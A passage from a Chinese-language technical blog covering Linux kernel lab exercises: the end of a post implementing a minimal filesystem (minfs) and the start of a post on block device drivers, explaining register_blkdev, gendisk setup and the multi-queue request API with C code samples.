<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">minfs_fs_type</span> =</span> &#123;</span><br><span class="line">	.owner		= THIS_MODULE,</span><br><span class="line">	.name		= <span class="string">&quot;minfs&quot;</span>,</span><br><span class="line">	.mount		= minfs_mount,</span><br><span class="line">	.kill_sb	= kill_block_super,</span><br><span class="line">	.fs_flags	= FS_USERNS_MOUNT,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>而在 <code>minfs_mount</code> 我们又只需要完成用于填充超级块的函数 <code>minfs_fill_super</code></li>
<li>这一部分和模板差不多，使用 <code>sb_bread</code> 读出超级块，效验 <code>magic number</code> 并且把超级块的信息填入 <code>minfs_sb_info</code>，我们需要完成 <code>minfs_ops</code> 中的函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> <span class="title">minfs_ops</span> =</span> &#123;</span><br><span class="line">	.statfs		= simple_statfs,</span><br><span class="line">	.put_super	= minfs_put_super,</span><br><span class="line">	.alloc_inode = minfs_alloc_inode,</span><br><span class="line">	.destroy_inode = minfs_destroy_inode,</span><br><span class="line">	.write_inode = minfs_write_inode,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>另外程序用于读取 inode 的 <code>minfs_iget</code> 函数需要实现</li>
<li>在 <code>minfs_iget</code> 中：<ul>
<li>先是使用 <code>iget_locked(s, ino)</code> 从挂载的文件系统获取 inode </li>
<li>然后就是对 inode 的初始化，分配 <code>address_space_operations</code></li>
<li>再根据 inode 类型为其分配对应的 <code>inode_operations</code> 和 <code>file_operations</code> </li>
<li>最后返回 inode</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">minfs_dir_operations</span> =</span> &#123;</span><br><span class="line">	.read		= generic_read_dir,</span><br><span class="line">	.iterate	= minfs_readdir,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">minfs_file_operations</span> =</span> &#123;</span><br><span class="line">	.read_iter	= generic_file_read_iter,</span><br><span class="line">	.write_iter	= generic_file_write_iter,</span><br><span class="line">	.mmap		= generic_file_mmap,</span><br><span class="line">	.llseek		= generic_file_llseek,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">minfs_dir_inode_operations</span> =</span> &#123;</span><br><span class="line">	.lookup		= minfs_lookup,</span><br><span class="line">	.create		= minfs_create,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> <span class="title">minfs_file_inode_operations</span> =</span> &#123;</span><br><span class="line">	.getattr	= simple_getattr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> <span class="title">minfs_aops</span> =</span> &#123;</span><br><span class="line">	.readpage       = simple_readpage,</span><br><span class="line">	.write_begin    = simple_write_begin,</span><br><span class="line">	.write_end      = simple_write_end,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中又需要我们实现的函数有：<code>minfs_create</code> <code>minfs_lookup</code> <code>minfs_readdir</code></li>
<li>借助参考答案和多次试错，感觉大体的流程清楚了，不过细节还需要打磨</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/Linux-Lab6-Block%20Device%20Drivers/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/Linux-Lab6-Block%20Device%20Drivers/" class="post-title-link" itemprop="url">Linux-Lab6-Block Device Drivers</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-17 22:20:51 / Modified: 22:21:38" itemprop="dateCreated datePublished" datetime="2022-10-17T22:20:51+08:00">2022-10-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>21k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Block Device Drivers</strong></p>
<p>实验室目标：</p>
<ul>
<li>获取有关 Linux 上 I/O 子系统行为的知识</li>
<li>块设备的结构和功能的实践活动</li>
<li>通过解决练习，获得将API用于块设备的基本技能</li>
</ul>
<p>块设备的特点是随机访问以固定大小的块组织的数据（此类设备的示例包括硬盘驱动器，CD-ROM驱动器，RAM磁盘等）</p>
<p>块设备的速度一般远高于字符设备的速度，它们的性能也很重要（这就是为什么 Linux 内核以不同的方式处理这两种类型的设备），因此，使用块设备比使用字符设备更复杂：</p>
<ul>
<li>字符设备具有单个当前位置</li>
<li>块设备必须能够移动到设备中的任何位置以提供对数据的随机访问</li>
</ul>
<p>为了简化块设备的使用，Linux 内核提供了一个称为块 I/O（或块层）子系统的整个子系统：</p>
<ul>
<li>从内核的角度来看，寻址的最小逻辑单元是块（尽管可以在扇区级别对物理设备进行寻址，但内核使用块执行所有磁盘操作）</li>
<li>由于物理寻址的最小单位是扇区，因此块的大小必须是扇区大小的倍数（块的大小因所使用的文件系统而异，最常见的值是 512B、1KB 和 4KB）</li>
</ul>
<p><strong>Register a block I/O device</strong></p>
<p>从 Linux 内核的 4.9 版开始，<code>register_blkdev</code> 调用是可选的，此函数执行的唯一操作是动态分配主要参数并在 <code>/proc/devices</code> 中创建条目（在将来的内核版本中，它可能会被删除，但是，大多数驱动程序仍然调用它）</p>
<p>通常，对寄存器函数的调用在模块初始化函数中执行，对取消注册函数的调用在模块退出函数中执行，典型方案如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLOCK_MAJOR           240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLKDEV_NAME          <span class="meta-string">&quot;mybdev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_block_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    status = register_blkdev(MY_BLOCK_MAJOR, MY_BLKDEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">0</span>) &#123;</span><br><span class="line">             printk(KERN_ERR <span class="string">&quot;unable to register mybdev block device\n&quot;</span>);</span><br><span class="line">             <span class="keyword">return</span> -EBUSY;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">     unregister_blkdev(MY_BLOCK_MAJOR, MY_BLKDEV_NAME);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Register a disk</strong></p>
<p>虽然函数 <code>register_blkdev</code> 注册了一个 <code>major</code>，但它不向系统提供设备（TYPE - disk），为了创建和使用块设备，使用 <code>linux/genhd.h</code> 中定义的专用接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alloc_disk(minors) alloc_disk_node(minors, NUMA_NO_NODE) <span class="comment">/* 分配一个块设备 */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_gendisk</span><span class="params">(struct gendisk *gp)</span></span>; <span class="comment">/* 解除指定的块设备 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_disk</span><span class="params">(struct gendisk *disk)</span></span>; <span class="comment">/* 将磁盘添加到系统 */</span></span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genhd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BLOCK_MINORS       1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">gendisk</span> *<span class="title">gd</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; dev;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">create_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dev-&gt;gd = alloc_disk(MY_BLOCK_MINORS);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    add_disk(dev-&gt;gd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;gd)</span><br><span class="line">        del_gendisk(dev-&gt;gd);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_block_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    create_block_device(&amp;dev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_block_device(&amp;dev);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在调用函数 <code>add_disk</code> 后（实际上在调用期间），磁盘立即处于活动状态，并且可以随时调用其方法</li>
<li>因此，在驱动程序完全初始化并准备好响应对已注册磁盘的请求之前，不应调用此函数</li>
</ul>
<p>结构体 <code>gendisk</code> 存储有关磁盘的信息，这样的结构是从调用 <code>alloc_disk</code> 中获得的，在将其发送到函数 <code>add_disk</code> 之前必须填充其字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gendisk</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> major;			<span class="comment">/* major number of driver */</span></span><br><span class="line">	<span class="keyword">int</span> first_minor;</span><br><span class="line">	<span class="keyword">int</span> minors;                     </span><br><span class="line">	<span class="keyword">char</span> disk_name[DISK_NAME_LEN];	<span class="comment">/*示在sysfs中和sysfs中显示的磁盘名称 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> events;		<span class="comment">/* supported events */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> event_flags;	<span class="comment">/* flags related to event processing */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">disk_part_tbl</span> __<span class="title">rcu</span> *<span class="title">part_tbl</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hd_struct</span> <span class="title">part0</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">block_device_operations</span> *<span class="title">fops</span>;</span> <span class="comment">/* 表示与磁盘关联的操作 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">request_queue</span> *<span class="title">queue</span>;</span> <span class="comment">/* 表示请求队列 */</span></span><br><span class="line">	<span class="keyword">void</span> *private_data; <span class="comment">/* 指向私有数据的指针 */</span></span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> state;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_NEED_PART_SCAN		0</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">lookup_sem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">slave_dir</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timer_rand_state</span> *<span class="title">random</span>;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> sync_io;		<span class="comment">/* RAID */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">disk_events</span> *<span class="title">ev</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  CONFIG_BLK_DEV_INTEGRITY</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">integrity_kobj</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_BLK_DEV_INTEGRITY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_CDROM)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdrom_device_info</span> *<span class="title">cdi</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> node_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">badblocks</span> *<span class="title">bb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>填充结构体 <code>gendisk</code> 的示例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genhd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blkdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_SECTORS                   1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_SECTOR_SIZE           512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;                <span class="comment">/* For mutual exclusion */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request_queue</span> *<span class="title">queue</span>;</span>    <span class="comment">/* The device request queue */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">gendisk</span> *<span class="title">gd</span>;</span>             <span class="comment">/* The gendisk structure */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; dev;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">create_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Initialize the gendisk structure */</span></span><br><span class="line">    dev-&gt;gd = alloc_disk(MY_BLOCK_MINORS);</span><br><span class="line">    <span class="keyword">if</span> (!dev-&gt;gd) &#123;</span><br><span class="line">        printk (KERN_NOTICE <span class="string">&quot;alloc_disk failure\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dev-&gt;gd-&gt;major = MY_BLOCK_MAJOR;</span><br><span class="line">    dev-&gt;gd-&gt;first_minor = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;gd-&gt;fops = &amp;my_block_ops;</span><br><span class="line">    dev-&gt;gd-&gt;<span class="built_in">queue</span> = dev-&gt;<span class="built_in">queue</span>;</span><br><span class="line">    dev-&gt;gd-&gt;private_data = dev;</span><br><span class="line">    <span class="built_in">snprintf</span> (dev-&gt;gd-&gt;disk_name, <span class="number">32</span>, <span class="string">&quot;myblock&quot;</span>);</span><br><span class="line">    set_capacity(dev-&gt;gd, NR_SECTORS);</span><br><span class="line"></span><br><span class="line">    add_disk(dev-&gt;gd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_block_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    status = create_block_device(&amp;dev);</span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;gd) &#123;</span><br><span class="line">        del_gendisk(dev-&gt;gd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_block_device(&amp;dev);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Request Queues Multi-Queue Block Layer</strong></p>
<p>块设备的驱动程序使用请求队列来存储将要处理的块 I/O 请求：</p>
<ul>
<li>请求队列由结构表示 <code>blk_mq_hw_ctx</code></li>
<li>请求队列由请求及其关联控制信息的双链表组成</li>
<li>请求通过更高级别的内核代码（例如，文件系统）添加到队列中</li>
</ul>
<p>块设备驱动程序可以在前一个请求完成之前接受请求，因此，上层需要一种方法来知道请求何时完成，为此，在提交时向每个请求添加一个“标记”（用结构体 <code>blk_mq_tag_set</code> 来描述），并在请求完成后使用完成通知发回</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_tag_set</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_queue_map</span>	<span class="title">map</span>[<span class="title">HCTX_MAX_TYPES</span>];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_maps;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_ops</span>	*<span class="title">ops</span>;</span> <span class="comment">/* 队列操作相关操作 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_hw_queues; <span class="comment">/* 为设备分配的硬件队列数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		queue_depth; <span class="comment">/* 硬件队列大小 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		reserved_tags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		cmd_size; <span class="comment">/* 在设备末尾分配的额外字节数,如果需要,将由块设备驱动程序使用 */</span></span><br><span class="line">	<span class="keyword">int</span>			numa_node; <span class="comment">/* 在NUMA系统中,这指的是存储设备连接到的节点的索引 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		timeout;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags;</span><br><span class="line">	<span class="keyword">void</span>			*driver_data; <span class="comment">/* 驱动程序专用数据 */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		active_queues_shared_sbitmap; </span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sbitmap_queue</span>	__<span class="title">bitmap_tags</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sbitmap_queue</span>	__<span class="title">breserved_tags</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_tags</span>	**<span class="title">tags</span>;</span> <span class="comment">/* 指向标签集数组的指针 */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">tag_list_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">tag_list</span>;</span> <span class="comment">/* 使用此标签集的请求队列链表 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct request_queue *<span class="title">blk_mq_init_queue</span><span class="params">(struct blk_mq_tag_set *)</span></span>; <span class="comment">/* 创建一个请求队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_cleanup_queue</span><span class="params">(struct request_queue *)</span></span>; <span class="comment">/* 清除一个请求队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">blk_mq_alloc_tag_set</span><span class="params">(struct blk_mq_tag_set *<span class="built_in">set</span>)</span></span>; <span class="comment">/* 初始化tag条目后,为一个或者多个请求队列分配tag和request集合 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_mq_free_tag_set</span><span class="params">(struct blk_mq_tag_set *<span class="built_in">set</span>)</span></span>; <span class="comment">/* 销毁并释放tag */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_mq_start_request</span><span class="params">(struct request *rq)</span></span>; <span class="comment">/* 在开始处理请求之前调用并通知上层 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_mq_requeue_request</span><span class="params">(struct request *rq, <span class="keyword">bool</span> kick_requeue_list)</span></span>; <span class="comment">/* 在队列中重新发送请求 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blk_mq_end_request</span><span class="params">(struct request *rq, <span class="keyword">blk_status_t</span> 